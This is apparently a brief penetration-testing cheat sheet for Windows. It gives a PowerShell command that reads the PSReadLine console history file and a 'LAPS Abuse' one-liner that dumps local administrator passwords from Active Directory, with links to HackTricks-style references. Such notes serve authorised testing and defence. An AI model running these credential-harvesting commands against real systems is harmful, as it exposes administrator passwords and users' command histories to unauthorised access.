# Windows
## Powershell enumeration
```ps1
## Powershell history file
 cd $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\
 type .\ConsoleHost_history.txt
 ```
## LAPS Abuse
```powershell
Get-ADComputer -Filter * -Properties 'ms-Mcs-AdmPwd' | Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null } | Select-Object 'Name','ms-Mcs-AdmPwd'
```
https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/laps.html

https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/laps
